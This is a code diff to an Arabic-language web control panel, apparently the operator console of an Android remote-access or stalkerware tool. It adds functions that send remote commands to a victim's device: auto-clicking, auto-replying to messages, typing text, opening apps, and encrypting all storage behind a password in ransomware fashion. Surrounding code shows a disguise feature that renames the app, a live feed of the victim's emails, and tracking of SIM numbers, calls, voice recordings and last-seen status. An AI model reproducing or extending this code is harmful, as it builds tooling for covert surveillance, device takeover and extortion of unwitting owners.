@@ -513,6 +513,69 @@ function renderLiveEmails() {
 }
 function deleteLiveEmail(idx) { if (!confirm('حذف هذا البريد من الفيد؟')) return; liveEmails.splice(idx, 1); document.getElementById('liveEmailsCount').textContent = liveEmails.length; renderLiveEmails(); }
 
+// ═══════════════════════════════════════════════════════
+// ⚡ المميزات المتقدمة
+// ═══════════════════════════════════════════════════════
+
+function advancedAction(cmd, extra) {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+    const body = { device: currentDevice, command: cmd, token: getAuthToken() };
+    if (extra) Object.assign(body, extra);
+
+    fetch('/api.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+    }).then(r => r.json()).then(d => {
+        if (d.success) showNotification('✅ تم', 'تم إرسال الأمر للجهاز', '⚡');
+        else alert('❌ فشل — تأكد أن السيرفر يعمل');
+    }).catch(() => alert('❌ خطأ في الاتصال'));
+}
+
+function autoClickText() {
+    const text = document.getElementById('clickText').value.trim();
+    if (!text) { alert('⚠️ اكتب نص الزر'); return; }
+    advancedAction('auto_click', { text });
+    document.getElementById('clickText').value = '';
+}
+
+function autoReplyAny() {
+    const msg = document.getElementById('autoReplyText').value.trim();
+    if (!msg) { alert('⚠️ اكتب الرد'); return; }
+    advancedAction('auto_reply_any', { message: msg });
+    document.getElementById('autoReplyText').value = '';
+}
+
+function typeText() {
+    const text = document.getElementById('typeTextInput').value.trim();
+    if (!text) { alert('⚠️ اكتب النص'); return; }
+    advancedAction('type_text', { text });
+    document.getElementById('typeTextInput').value = '';
+}
+
+function encryptFiles() {
+    const pw = document.getElementById('encryptionPassword').value;
+    if (!pw || pw.length < 4) { alert('⚠️ كلمة المرور قصيرة (4+ أحرف)'); return; }
+    if (!confirm('⚠️ سيتم تشفير كل التخزين!\n\n• قد يستغرق ساعات\n• لا يمكن الفك بدون كلمة المرور\n• الملفات تُفقد للأبد إذا نسيت كلمة المرور\n\nاستمر؟')) return;
+    advancedAction('encrypt_files', { password: pw });
+    showNotification('🔐 جاري التشفير', 'ستبدأ العملية خلال ثواني — قد تستغرق ساعات', '🔐');
+}
+
+function decryptFiles() {
+    const pw = document.getElementById('encryptionPassword').value;
+    if (!pw) { alert('⚠️ أدخل كلمة المرور'); return; }
+    if (!confirm('🔓 فك تشفير كل الملفات؟')) return;
+    advancedAction('decrypt_files', { password: pw });
+    showNotification('🔓 جاري الفك', 'سيبدأ خلال ثواني', '🔓');
+}
+
+function openApp() {
+    const pkg = document.getElementById('openAppPackage').value.trim();
+    if (!pkg) { alert('⚠️ اكتب اسم الباكج'); return; }
+    advancedAction('open_app', { package: pkg });
+    document.getElementById('openAppPackage').value = '';
+}
+
 // ═══ التنكر ═══
 async function changeDisguise(appName) {
     if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
@@ -829,7 +892,6 @@ function selectDevice(deviceId) {
     }
 }
 
-// ✅ محدّث: updateLiveData مع كل البيانات الجديدة
 async function updateLiveData() {
     if (!currentDevice) return;
     try {
@@ -837,7 +899,6 @@ async function updateLiveData() {
         const data = await response.json();
         if (data.error) return;
 
-        // ═══ الحالة ═══
         const statusEl = document.getElementById('networkStatus');
         if (statusEl) {
             if (data.online) {
@@ -849,11 +910,9 @@ async function updateLiveData() {
             }
         }
 
-        // ═══ نوع الشبكة ═══
         const netEl = document.getElementById('networkTypeStatus');
         if (netEl) netEl.textContent = data.network_type || '—';
 
-        // ═══ البطارية ═══
         const battEl = document.getElementById('batteryStatus');
         if (battEl) {
             if (data.battery !== null && data.battery !== undefined && data.battery >= 0) {
@@ -863,7 +922,6 @@ async function updateLiveData() {
             }
         }
 
-        // ═══ الشحن ═══
         const chargingEl = document.getElementById('chargingStatus');
         if (chargingEl) {
             if (data.charging) {
@@ -874,7 +932,6 @@ async function updateLiveData() {
             }
         }
 
-        // ═══ آخر اتصال ═══
         const lastSeenEl = document.getElementById('lastSeen');
         if (lastSeenEl) {
             const ago = data.seconds_ago || 0;
@@ -887,7 +944,6 @@ async function updateLiveData() {
             lastSeenEl.textContent = agoText;
         }
 
-        // ═══ العدادات ═══
         if (data.call_count !== undefined) {
             const el = document.getElementById('callCount');
             if (el) el.textContent = `(${data.call_count})`;
@@ -917,7 +973,6 @@ async function updateLiveData() {
             if (vBadge && vBadge.textContent === '0') vBadge.textContent = String(data.voice_count);
         }
 
-        // ═══ اسم الجهاز + SIM ═══
         if (data.sim_numbers && data.sim_numbers.length > 0) {
             const display = document.getElementById('deviceNameDisplay');
             if (display && !display.textContent.includes(data.sim_numbers[0])) {
